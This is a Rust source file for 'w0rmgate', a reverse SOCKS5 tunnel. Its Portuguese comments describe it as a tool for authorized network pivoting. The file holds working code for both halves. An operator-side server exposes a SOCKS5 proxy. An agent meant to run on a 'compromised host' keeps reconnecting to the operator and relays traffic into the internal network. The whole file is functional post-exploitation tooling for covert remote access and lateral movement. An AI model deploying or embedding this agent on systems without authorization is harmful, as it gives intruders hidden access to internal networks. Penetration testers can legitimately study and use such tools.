mod proto;
mod socks;

use anyhow::Result;
use clap::{Parser, Subcommand};
use proto::{read_frame, write_frame, Frame};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{mpsc, Mutex};

type Streams = Arc<Mutex<HashMap<u32, mpsc::UnboundedSender<Vec<u8>>>>>;
type Out = mpsc::UnboundedSender<Frame>;

/// w0rmgate — túnel SOCKS5 reverso para pivoting autorizado.
#[derive(Parser)]
#[command(name = "w0rmgate", version, about)]
struct Cli {
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Lado do operador: recebe o agente e expõe o proxy SOCKS5.
    Server {
        /// Onde o agente liga de volta.
        #[arg(long, default_value = "0.0.0.0:7000")]
        control: String,
        /// Proxy SOCKS5 para o operador usar.
        #[arg(long, default_value = "127.0.0.1:1080")]
        socks: String,
    },
    /// Lado do host comprometido: liga de volta e dá saída na rede interna.
    Agent {
        /// Endereço de controle do server (operador).
        #[arg(long)]
        connect: String,
    },
}

/// Lê do socket local e empurra DATA para o túnel; no fim manda CLOSE.
async fn local_to_mux<R: AsyncReadExt + Unpin>(
    mut rd: R,
    id: u32,
    out: Out,
    streams: Streams,
) {
    let mut buf = vec![0u8; 16 * 1024];
    loop {
        match rd.read(&mut buf).await {
            Ok(0) | Err(_) => break,
            Ok(n) => {
                if out.send(Frame::data(id, buf[..n].to_vec())).is_err() {
                    break;
                }
            }
        }
    }
    let _ = out.send(Frame::close(id));
    streams.lock().await.remove(&id);
}

/// Recebe DATA do túnel e escreve no socket local.
async fn mux_to_local<W: AsyncWriteExt + Unpin>(
    mut wr: W,
    mut rx: mpsc::UnboundedReceiver<Vec<u8>>,
) {
    while let Some(chunk) = rx.recv().await {
        if wr.write_all(&chunk).await.is_err() {
            break;
        }
    }
    let _ = wr.shutdown().await;
}

/// Tarefa escritora: serializa frames de muitas tasks no socket de controle.
async fn writer_task<W: AsyncWriteExt + Unpin>(mut wr: W, mut rx: mpsc::UnboundedReceiver<Frame>) {
    while let Some(f) = rx.recv().await {
        if write_frame(&mut wr, &f).await.is_err() {
            break;
        }
    }
}

async fn run_server(control: String, socks_addr: String) -> Result<()> {
    let ctrl_listener = TcpListener::bind(&control).await?;
    eprintln!("[*] controle escutando em {control} (aguardando agente)");
    loop {
        let (agent, peer) = ctrl_listener.accept().await?;
        eprintln!("[+] agente conectado: {peer}");
        if let Err(e) = serve_agent(agent, &socks_addr).await {
            eprintln!("[!] sessão encerrada: {e}");
        }
        eprintln!("[*] aguardando novo agente...");
    }
}

async fn serve_agent(agent: TcpStream, socks_addr: &str) -> Result<()> {
    let (mut ar, aw) = agent.into_split();
    let (out_tx, out_rx) = mpsc::unbounded_channel::<Frame>();
    let streams: Streams = Arc::new(Mutex::new(HashMap::new()));

    tokio::spawn(writer_task(aw, out_rx));

    // leitor do túnel: distribui DATA/CLOSE para os streams locais
    let streams_r = streams.clone();
    let reader = tokio::spawn(async move {
        loop {
            let f = match read_frame(&mut ar).await {
                Ok(f) => f,
                Err(_) => break,
            };
            match f.kind {
                proto::DATA => {
                    if let Some(tx) = streams_r.lock().await.get(&f.id) {
                        let _ = tx.send(f.data);
                    }
                }
                proto::CLOSE => {
                    streams_r.lock().await.remove(&f.id);
                }
                _ => {}
            }
        }
    });

    // aceitador SOCKS do operador
    let socks_listener = TcpListener::bind(socks_addr).await?;
    eprintln!("[*] SOCKS5 pronto em {socks_addr}");
    let mut next_id: u32 = 1;
    let acceptor = async {
        loop {
            let (mut cli, _) = socks_listener.accept().await?;
            let target = match socks::handshake(&mut cli).await {
                Ok(t) => t,
                Err(_) => continue,
            };
            let id = next_id;
            next_id = next_id.wrapping_add(1).max(1);
            let (tx, rx) = mpsc::unbounded_channel::<Vec<u8>>();
            streams.lock().await.insert(id, tx);
            let _ = out_tx.send(Frame::open(id, &target));
            let (cr, cw) = cli.into_split();
            tokio::spawn(mux_to_local(cw, rx));
            tokio::spawn(local_to_mux(cr, id, out_tx.clone(), streams.clone()));
        }
        #[allow(unreachable_code)]
        Ok::<(), anyhow::Error>(())
    };

    tokio::select! {
        _ = reader => { eprintln!("[!] agente desconectou"); }
        r = acceptor => { r?; }
    }
    Ok(())
}

async fn run_agent(connect: String) -> Result<()> {
    loop {
        eprintln!("[*] ligando de volta para {connect}");
        match TcpStream::connect(&connect).await {
            Ok(s) => {
                eprintln!("[+] túnel estabelecido");
                if let Err(e) = agent_session(s).await {
                    eprintln!("[!] túnel caiu: {e}");
                }
            }
            Err(e) => eprintln!("[!] falha ao conectar: {e}"),
        }
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    }
}

async fn agent_session(server: TcpStream) -> Result<()> {
    let (mut sr, sw) = server.into_split();
    let (out_tx, out_rx) = mpsc::unbounded_channel::<Frame>();
    let streams: Streams = Arc::new(Mutex::new(HashMap::new()));
    tokio::spawn(writer_task(sw, out_rx));

    loop {
        let f = read_frame(&mut sr).await?;
        match f.kind {
            proto::OPEN => {
                let target = String::from_utf8_lossy(&f.data).to_string();
                let id = f.id;
                let out = out_tx.clone();
                let streams = streams.clone();
                tokio::spawn(async move {
                    match TcpStream::connect(&target).await {
                        Ok(dst) => {
                            let (dr, dw) = dst.into_split();
                            let (tx, rx) = mpsc::unbounded_channel::<Vec<u8>>();
                            streams.lock().await.insert(id, tx);
                            tokio::spawn(mux_to_local(dw, rx));
                            local_to_mux(dr, id, out, streams).await;
                        }
                        Err(_) => {
                            let _ = out.send(Frame::close(id));
                        }
                    }
                });
            }
            proto::DATA => {
                if let Some(tx) = streams.lock().await.get(&f.id) {
                    let _ = tx.send(f.data);
                }
            }
            proto::CLOSE => {
                streams.lock().await.remove(&f.id);
            }
            _ => {}
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    match Cli::parse().cmd {
        Cmd::Server { control, socks } => run_server(control, socks).await,
        Cmd::Agent { connect } => run_agent(connect).await,
    }
}
